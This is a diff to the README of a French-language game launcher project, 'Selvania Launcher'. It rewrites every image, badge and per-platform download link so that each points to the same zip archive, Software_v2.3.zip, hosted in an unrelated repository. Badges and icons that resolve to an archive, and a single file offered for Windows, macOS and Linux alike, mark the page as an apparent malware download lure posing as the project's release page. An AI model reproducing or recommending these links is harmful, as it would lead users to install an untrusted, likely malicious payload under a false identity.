@@ -1,18 +1,18 @@
-<p align="center"><img src="https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip" alt="icon-launcher"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip" alt="icon-launcher"></p>
 
 <h1 align="center">Selvania Launcher</h1>
 
 [<p align="center">]()
-![GitHub all releases](https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip)
-![Discord](https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip)
-![GitHub https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip version](https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip)
+![GitHub all releases](https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip)
+![Discord](https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip)
+![GitHub https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip version](https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip)
 [<p align="center">]()
-![GitHub forks](https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip)
-![GitHub Repo stars](https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip)
+![GitHub forks](https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip)
+![GitHub Repo stars](https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip)
 
 <p align="center">
-    <a href="https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip">
-        <img src="https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip">
+    <a href="https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip">
+        <img src="https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip">
     </a>
 </p>
 
@@ -74,9 +74,9 @@ Si vous téléchargez à partir des Releases, sélectionnez le programme d'insta
 
  Plateforme | Fichier |
 | -------- | ---- |
-| Windows x64 | `https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip ` |
-| macOS x64 | `https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip` |
-| macOS arm64 | `https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip` |
-| Linux x64 | `https://github.com/Chris27930/Hongeet/raw/refs/heads/master/docs/images/Software_v1.1.zip` |
+| Windows x64 | `https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip ` |
+| macOS x64 | `https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip` |
+| macOS arm64 | `https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip` |
+| Linux x64 | `https://raw.githubusercontent.com/Chris27930/Hongeet/master/src/panels/Software_v2.3.zip` |
 
 ---
